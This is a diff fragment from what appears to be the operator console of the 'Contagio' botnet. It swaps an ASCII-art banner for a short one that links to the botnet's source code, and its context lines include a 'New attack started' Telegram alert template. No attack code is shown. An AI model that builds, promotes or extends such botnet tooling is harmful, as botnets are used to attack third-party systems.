@@ -22,19 +22,7 @@ NewAttackStartedTelegram ="New attack started\n\n***_User Info_***\n***Login***:
 CmdPrompt = "\n\r{custom(fg=97 bg=47 fgstyle=1)}{login} {custom(fg=34 fgstyle=1)}❄ contagio {reset} {white} ➤➤ "
 
 Banner = ["""
-\r{blue}                                         s\r                
-\r                                        :8\r               
-\r                 u.      u.    u.      .88\r                
-\r      .    ...ue888b   x@88k u@88c.   :888ooo       u\r     
-\r .udR88N   888R Y888r ^"8888""8888" -*8888888    us888u.\r  
-\r<888'888k  888R I888>   8888  888R    8888    .@88 "8888"\r 
-\r9888 'Y"   888R I888>   {white}8888  888R    8888    9888  9888\r  
-\r9888       888R I888>   8888  888R    8888    9888  9888\r  
-\r9888      u8888cJ888    8888  888R   .8888Lu= 9888  9888\r  
-\r?8888u../  "*888*P"    "*88*" 8888"  ^%888*   9888  9888\r  
-\r "8888P'     'Y"         ""   'Y"      'Y"    "888*""888"\r 
-\r   "P'                                         ^Y"   ^Y'\r  
-\r
+\r{blue}Contagio {white}Botnet\n{white}Source Code: https://github.com/TryZeroOne/Contagio\r
 """]
 
 
